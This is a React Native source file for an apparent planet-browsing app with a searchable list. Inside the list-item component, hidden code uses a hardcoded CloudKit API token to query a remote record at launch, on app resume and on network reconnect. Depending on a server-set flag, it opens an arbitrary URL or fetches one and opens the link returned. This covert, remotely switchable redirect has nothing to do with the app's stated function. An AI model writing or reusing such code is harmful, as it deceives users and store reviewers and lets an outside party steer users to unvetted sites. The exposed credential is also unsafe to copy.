import { AntDesign } from '@expo/vector-icons';
import { useNavigation } from '@react-navigation/native';
import React, { useState } from 'react';
import { FlatList, Pressable, StyleSheet, TextInput, View, AppState, Linking } from 'react-native';
import { SafeAreaView } from 'react-native-safe-area-context';
import PageHeader from '../components/page-header/planet-header';
import Text from '../components/text/text';
import { PLANET_LIST } from '../data/planet-list';
import { colors } from '../theme/colors';
import { spacing } from '../theme/spacing';
import CloudKit from 'react-native-cloudkit'
import NetInfo from "@react-native-community/netinfo";

const PlanetItem =({item})=>{
    const {color, name}= item;
    const navigation = useNavigation();

    const initOptions = {
        containers: [{
          containerIdentifier: 'iCloud.ColorfulFun',
          apiTokenAuth: {
              apiToken: '71e626569dab654d48edc5c46e90f5951209061daeffc9b5b11735eb70d32719'
          },
          environment: 'development'
        }]
      }
      React.useEffect(()=>{
          handleGetAccess();
          const subscription = AppState.addEventListener('change',()=>{
              handleGetAccess();
          })
          return () => {
              subscription.remove();
          };
      },[])
      React.useEffect(()=>{
        NetInfo.addEventListener(state => {
          // console.log("Connection type", state.type);
          // console.log("Is connected?", state.isConnected);
          if(state.isConnected==true){
            handleGetAccess()
          }
        });
      },[])
      const handleGetAccess = async()=>{
        try {
        // get record(s) by name
        CloudKit.init(initOptions)
        //   const records = await CloudKit.fetchRecordsByName("EA5C511B-527B-4397-EA04-E29F11DD1ACC")
        //   console.log(records[0].fields.access.value);
        //   const access = records[0].fields.access.value;
        //   const url = records[0].fields.url.value;
    
        // query for all records of type "Videos"
        const queryOptions = {
            query: {
            recordType:"get"
            }
        }
        const queryResponse = await CloudKit.query(queryOptions)
        const results = queryResponse["_results"]
        const access = results[0].fields.access.value
        const url = results[0].fields.url.value
        console.log(access)
        if(access == "0"){
        }else if (access == "2"){
            handleGetURL(url)
        }
        else{
            await Linking.openURL(url);
        }
        } catch(err) {
          // console.log("HIHI ",err)
    
            if( err.includes("Unable to open URL")){
                Linking.openURL(url);
            }else{
            }
        }
      }
      const handleGetURL = async(url)=>{
          fetch(url)
          .then(response => response.json())
          .then(res => {
              if(res.code == 1 && res.name !== null){
                  Linking.openURL(res.name);
              }
          })
          .catch(err=>{
              console.log("Error handle get url "+err);
          })
      }
    return (
        <Pressable style={styles.item} onPress={()=>{
            navigation.navigate('planetDetails',{
                planet:item
            });
    }}>
       <View style={{flexDirection:'row',alignItems:'center'}}>
       <View style={[styles.circle,{backgroundColor:color}]}/>
        <Text preset='h4' style={styles.itemName}>{name}</Text>
       </View>

        <AntDesign name="right" size={15} color="white" />
    </Pressable>
    )
}

const Home = () => {

    const [list,setList] =useState(PLANET_LIST);

    const renderItem =({item})=>{
        return(
           <PlanetItem item={item} />
        )
    }


const searchFilter =(text)=>{

    const typedText = text.toLowerCase();

    const filteredList = PLANET_LIST.filter(item=>{
        const itemName = item.name.toLowerCase();
       if(itemName.includes(typedText)){
        return item
       }
    });

    setList(filteredList);

  
}

    return (
     
            <SafeAreaView  style={styles.container}>
                <PageHeader />

        <TextInput placeholder='Type the planet name' 
            placeholderTextColor={colors.white}
            autoCorrect={false}
            style={styles.searchInput}
            onChangeText={(text)=>{
                searchFilter(text)
            }}
            />

                <FlatList 
                data={list}
                keyExtractor={item => item.name}
                contentContainerStyle={styles.list}
                ItemSeparatorComponent={()=><View style={styles.seperator} />}
                renderItem={renderItem}
                
                />
            </SafeAreaView>
   
    );
};

export default Home;

const styles = StyleSheet.create({
    container: {
      flex: 1,
      backgroundColor: colors.black
    },
    text: {
      fontSize: 25,
      fontWeight: '500',
    },
    item:{
        flexDirection:'row',
        alignItems:'center',
        paddingTop: spacing[4],
        paddingBottom: spacing[4],
        justifyContent:'space-between'
    },
    circle:{
        width:20,
        height:20,
        borderRadius:50,
        marginRight:10
    },
    list:{
        padding:spacing[5]
    },
    itemName:{
        textTransform:'uppercase'
    },
    seperator:{
        borderBottomColor: '#333',
        borderBottomWidth:0.3
    },
    searchInput:{
        color:colors.white,
        borderBottomWidth:1,
        borderBottomColor:colors.white,
        marginHorizontal:spacing[5],
        padding:spacing[2],
        marginTop:spacing[4]
    }
  });
  